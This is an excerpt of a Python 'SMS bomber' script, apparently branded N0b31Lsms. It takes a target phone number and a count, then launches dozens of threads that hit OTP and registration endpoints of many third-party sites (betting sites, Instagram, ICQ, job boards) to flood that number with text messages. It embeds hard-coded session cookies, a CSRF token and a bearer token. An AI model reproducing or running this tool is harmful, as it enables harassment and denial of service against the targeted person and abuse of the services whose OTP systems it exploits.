...
os.system(f'cls & mode 85,14 & title DisconnectZc#2000')
...
os.system(f'cls & mode 90,30 & title phuphaSMS')
...
def sms_pam():
    ...
    gradient_print(
        """
           ...
           -Get N0b31Lsms for free at
            https://n0b31l2244.github.io/
            https://github.com/N0b31l2244
           -N0B31Lsms is not for sale
           -109 api

        """, 
        start_color=Color.blue_violet, 
        end_color=Color.purple 
    )
    print("")
    print("")
    phone = input(f"{Color.blue_violet}phone: >>> ")
    count = int(input(f"{Color.blue_violet}manySMS: >>> "))
    print()
    sleep(1)
    ...
    def trueh():
        try:
            ...
            print(receive_color() + f'[{now()}] Successfully sms  byN0b31lSMS ()')
        except:pass
    ...
    def api35():
        try:
            ...
            "cookie": "_gcl_au=1.1.1272461332.1638187764;G_ENABLED_IDPS=google;_ga=GA1.3.808434087.1638187769;__lt__cid=10b9db7a-fed7-4a04-99d2-cdf99ccd76b8;_gid=GA1.3.1113186157.1639742520;_fbp=fb.2.1639742521800.1608632439;ajs_anonymous_id=fc77ca54-b140-4d14-a811-9be694d4dcfa;_hjSessionUser_1895262=eyJpZCI6IjJmYTg1NjkzLTIwYWUtNTQ3ZC1iYTgyLTZjMTZhNDE4N2VjOSIsImNyZWF0ZWQiOjE2Mzk3NDI1MjIzMDAsImV4aXN0aW5nIjp0cnVlfQ==;_cc_id=c18b09fbdfdf3183761afb6f7799f21d;panoramaId_expiry=1640349594875;panoramaId=052fccf0cccc27f1f255389082ee16d53938c5a780adb183ac3642512b6c17dc;_clck=18ofz7k|1|exd|0;sms_pamylab_deviceId=IuD7oBeC61H6n41Z1FH3ek;_gcl_aw=GCL.1639853869.Cj0KCQiAqvaNBhDLARIsAH1Pq53bS1JUOrg_c7AM2rjbL8ROKwGaHxVkCyIhqOPhU5bzui7v2wek3bEaAuooEALw_wcB;_gcl_dc=GCL.1639853869.Cj0KCQiAqvaNBhDLARIsAH1Pq53bS1JUOrg_c7AM2rjbL8ROKwGaHxVkCyIhqOPhU5bzui7v2wek3bEaAuooEALw_wcB;amp_893e6b=IuD7oBeC61H6n41Z1FH3ek...1fn7egd40.1fn7egjki.1.3.4;__lt__sid=f6ad8bda-06d0796d;_gac_UA-70043720-5=1.1639853872.Cj0KCQiAqvaNBhDLARIsAH1Pq53bS1JUOrg_c7AM2rjbL8ROKwGaHxVkCyIhqOPhU5bzui7v2wek3bEaAuooEALw_wcB;_gat_UA-70043720-5=1;_uetsid=23e4ae005f3111ec8d8c79ffb5e7c09b;_uetvid=33f5ca20510d11ec8e1175a84efe64f8;_hjSession_1895262=eyJpZCI6IjY2YWZlZmI0LWMwMDYtNGFkMS1hMWE3LTQ3NDllYmQ2MDNjYSIsImNyZWF0ZWQiOjE2Mzk4NTM4NzU4MDd9;_hjIncludedInPageviewSample=1;_hjAbsoluteSessionInProgress=0;_hjIncludedInSessionSample=0;_clsms_pam=15fms60|1639853877001|1|1|e.clarity.ms/collect"
            }
    ...
    def api36():
        try:
            head = {
            "authorization": "Bearer eyJ0eXAiOiJKV1QiLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwiYWxnIjoiZGlyIn0..o2KGFaI9sj29aEhCf9hApg.8hkBGU4xqfvuMOjMnNVDZjwqkjUcapX7Nnm4r5NZ-LsHH54KqovZT8Ocwsms_pamjsUoh0_8NKc7aBicXTwiVy-yR_lly-2hWlWsxCG8cR-ucaKrjhJPzHMoLHdw8TKNeeIq5kGuyTsmB-WVAxDn7G5-v0Q.RkQDS8sYQYMpTilU1VOz1A",
            "content-type": "application/json; charset=utf-8",
            "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
            "accept": "*/*",
    ...
    def newa37():
        try:
            ...
            print(receive_color() + f'[{now()}] Successfully sms  byN0b31lSMS (ezregis01)')
        except:pass

    def newa38():
        try:
            requests.post("https://mapi.dung919.com/api/otp/register",json={"applicant":f"{phone}","serviceName":"dung919.com"})
            print(receive_color() + f'[{now()}] Successfully sms  byN0b31lSMS (mapi.dung919)')
        except:pass
    ...
    def newa39():
        try:
            ...
            print(receive_color() + f'[{now()}] Successfully sms  byN0b31lSMS (instagram)')
        except:pass

    def newa41():
        try:
            requests.post("https://1ufa.bet/_ajax_/request-otp", data={"request_otp[phoneNumber]": f"0{phone}", "request_otp[termAndCondition]": "1", "request_otp[_token]": "U5doBrJJ5u91294kDU40Z_KrdPLTcfNQ5J3MhDsyg8M"}, headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36","Content-Type": "application/x-www-form-urlencoded","Cookie": "_gid=GA1.2.1736081460.1679951032; PHPSESSID=0j2uoh0oesv4ngaopas52ug8gk; _raw_ref=https%3A%2F%2F1ufa.bet%2F; _ga=GA1.2.1166363420.1679951032; _ga_5148MHRV47=GS1.1.1679951031.1.1.1679952029.0.0.0"})
            print(receive_color() + f'[{now()}] Successfully sms  byN0b31lSMS (1ufa)')
        except:pass
    ...
    def newa40():
        try:
            ...
            print(receive_color() + f'[{now()}] Successfully sms  byN0b31lSMS (api.set.or.th)')
        except:pass
    ...
    def newa42():
        try:
            ...
            print(receive_color() + f'[{now()}] Successfully sms  byN0b31lSMS (api.jobbkk)')
        except:pass
    ...
    def icq():
        try:
            ...
            print(receive_color() + f'[{now()}] Successfully sms  byN0b31lSMS (u.icq.net)')
        except:pass
    ...
    def firster():
        try:
            ...
            print(receive_color() + f'[{now()}] Successfully sms  byN0b31lSMS (graph.firster)')
        except:pass
    ...
    for i in range(count):
        ...
        threading.Thread(target=sms_pam1).start()
        threading.Thread(target=sms_pam3).start()
        threading.Thread(target=sms_pam5).start()
        threading.Thread(target=sms_pam7).start()
        threading.Thread(target=sms_pam9).start()
        threading.Thread(target=sms_pam10).start()
        threading.Thread(target=sms_pam11).start()
        threading.Thread(target=sms_pam13).start()
        threading.Thread(target=sms_pam15).start()
        threading.Thread(target=sms_pam16).start()
        threading.Thread(target=sms_pam17).start()
        threading.Thread(target=sms_pam21).start()
        threading.Thread(target=sms_pam23).start()
        threading.Thread(target=sms_pam24).start()
        threading.Thread(target=sms_pam25).start()
        threading.Thread(target=sms_pam26).start()
        threading.Thread(target=sms_pam27).start()
        threading.Thread(target=sms_pam28).start()
        threading.Thread(target=sms_pam29).start()
        threading.Thread(target=sms_pam30).start()
        threading.Thread(target=sms_pam31).start()
        threading.Thread(target=sms_pam32).start()
